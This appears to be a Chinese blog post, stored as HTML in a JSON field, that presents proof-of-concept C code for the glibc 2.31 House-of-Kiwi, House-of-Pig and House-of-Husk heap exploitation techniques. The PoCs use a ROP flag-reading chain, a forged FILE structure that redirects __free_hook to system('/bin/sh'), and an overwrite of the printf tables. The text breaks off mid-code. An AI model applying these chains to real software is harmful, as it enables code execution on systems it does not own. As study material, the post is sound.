            "content_html": "<p>libc2.31 版本可用</p>\n<a id=\"more\"></a>\n<h1 id=\"适用于高版本的三大house\"><a class=\"markdownIt-Anchor\" href=\"#适用于高版本的三大house\">#</a> 适用于高版本的三大 house</h1>\n<p>其中 House-of-Kiwi 需要进行两次任意地址申请，实现起来是比较困难的</p>\n<p>而 House-of-Pig 和 House-of-Husk 只需要写可控地址就行了，用 Large bin attack 就可以做到，但是 House-of-Husk 需要有 printf 和格式化字符串并且只能执行 gadget</p>\n<h2 id=\"house-of-kiwi\"><a class=\"markdownIt-Anchor\" href=\"#house-of-kiwi\">#</a> House-of-Kiwi</h2>\n<p>poc 参考：<a href=\"https://www.anquanke.com/post/id/235598\">House OF Kiwi - by Refrain</a></p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token comment\">// Ubuntu GLIBC 2.31-0ubuntu9.2</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdint.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;assert.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/prctl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;linux/filter.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;linux/seccomp.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">pop_rdi_ret libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000026b72</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">pop_rdx_r12 libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x000000000011c371</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">pop_rsi_ret libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000027529</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">pop_rax_ret libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x000000000004a550</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">syscall_ret libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000066229</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">ret pop_rdi_ret<span class=\"token operator\">+</span><span class=\"token number\">1</span> </span></span>\nsize_t ROP<span class=\"token punctuation\">[</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\nsize_t libc_base<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">char</span> FLAG<span class=\"token punctuation\">[</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"./flag.txt\\x00\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">sandbox</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">prctl</span><span class=\"token punctuation\">(</span>PR_SET_NO_NEW_PRIVS<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">sock_filter</span> sfi<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x00000004</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x15</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x05</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xC000003E</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x00000000</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x35</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x40000000</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x15</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xFFFFFFFF</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x15</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x0000003B</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x06</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7FFF0000</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x06</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x00000000</span><span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">sock_fprog</span> sfp <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> sfi<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">prctl</span><span class=\"token punctuation\">(</span>PR_SET_SECCOMP<span class=\"token punctuation\">,</span> SECCOMP_MODE_FILTER<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>sfp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">setROP</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    uint32_t i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_rax_ret<span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_rdi_ret<span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size_t<span class=\"token punctuation\">)</span>FLAG<span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_rsi_ret<span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> syscall_ret<span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_rdi_ret<span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_rdx_r12<span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_rsi_ret<span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size_t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>FLAG <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size_t<span class=\"token punctuation\">)</span>read<span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_rdi_ret<span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    ROP<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size_t<span class=\"token punctuation\">)</span>write<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">sandbox</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    libc_base  <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>size_t<span class=\"token punctuation\">)</span>setvbuf<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x87e60</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"LIBC:\\t%#lx\\n\"</span><span class=\"token punctuation\">,</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    size_t magic_gadget <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x580a0</span> <span class=\"token operator\">+</span> <span class=\"token number\">61</span><span class=\"token punctuation\">;</span>\n    size_t IO_helper <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x1ec8a0</span><span class=\"token punctuation\">;</span>\n    size_t SYNC <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x1ed500</span><span class=\"token punctuation\">;</span> \n    <span class=\"token function\">setROP</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>size_t<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>IO_helper <span class=\"token operator\">+</span> <span class=\"token number\">0xA0</span><span class=\"token operator\">/</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> ROP<span class=\"token punctuation\">;</span> <span class=\"token comment\">//攻击点1</span>\n    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>size_t<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>IO_helper <span class=\"token operator\">+</span> <span class=\"token number\">0xA8</span><span class=\"token operator\">/</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> ret<span class=\"token punctuation\">;</span>\n    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>size_t<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>SYNC<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> magic_gadget<span class=\"token punctuation\">;</span> <span class=\"token comment\">//攻击点2</span>\n\n    size_t <span class=\"token operator\">*</span>top_size <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size_t<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token operator\">*</span>top_size <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>top_size<span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">0xFFE</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//攻击点3</span>\n    \n    <span class=\"token comment\">// getchar();</span>\n    <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 触发assert</span>\n    <span class=\"token function\">_exit</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<h2 id=\"house-of-pig\"><a class=\"markdownIt-Anchor\" href=\"#house-of-pig\">#</a> House-of-Pig</h2>\n<p>poc</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token comment\">// Ubuntu GLIBC 2.31-0ubuntu9.2</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdint.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">system libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x55410</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">_IO_list_all libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x1ec5a0</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">_IO_str_jumps libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x1ed560</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">__free_hook libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x1eeb28</span></span></span>\n\nsize_t data<span class=\"token punctuation\">[</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\nsize_t fake_io<span class=\"token punctuation\">[</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\nsize_t libc_base<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">setFakeIo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    fake_io<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    fake_io<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0xffffffffffff</span><span class=\"token punctuation\">;</span>\n    fake_io<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> data<span class=\"token punctuation\">;</span>\n    fake_io<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> data <span class=\"token operator\">+</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">;</span>\n    fake_io<span class=\"token punctuation\">[</span><span class=\"token number\">27</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> _IO_str_jumps <span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">setData</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    data<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x0068732f6e69622f</span><span class=\"token punctuation\">;</span>\n    data<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> system<span class=\"token punctuation\">;</span>\n    data<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> system<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    libc_base  <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>size_t<span class=\"token punctuation\">)</span>setvbuf<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x87e60</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>size_t<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>_IO_list_all<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> fake_io<span class=\"token punctuation\">;</span> <span class=\"token comment\">//攻击点1</span>\n\n    <span class=\"token function\">setData</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">setFakeIo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \n    size_t <span class=\"token operator\">*</span>heap_base <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size_t<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x2a0</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>heap_base <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x168</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token number\">8</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> __free_hook <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//攻击点2（tcache管理块）</span>\n    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>heap_base <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x38</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x2</span> <span class=\"token punctuation\">)</span><span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<h2 id=\"house-of-husk\"><a class=\"markdownIt-Anchor\" href=\"#house-of-husk\">#</a> House-of-Husk</h2>\n<p>poc</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token comment\">// Ubuntu GLIBC 2.31-0ubuntu9.2</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">ogg libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0xe6c7e</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">__printf_arginfo_table libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x1f1350</span></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token expression\">__printf_function_table libc_base <span class=\"token operator\">+</span> <span class=\"token number\">0x1f0ff8</span></span></span>\n\nsize_t fake_zone<span class=\"token punctuation\">[</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\nsize_t libc_base<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    libc_base  <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>size_t<span class=\"token punctuation\">)</span>setvbuf<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x87e60</span><span class=\"token punctuation\">;</span>\n    fake_zone<span class=\"token punctuation\">[</span><span class=\"token number\">0x73</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> ogg<span class=\"token punctuation\">;</span> \n\n    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>size_t<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>__printf_arginfo_table<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> fake_zone<span class=\"token punctuation\">;</span> <span class=\"token comment\">//攻击点1</span>\n    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>size_t<span class=\"token operator\">*</span><span class=\"token 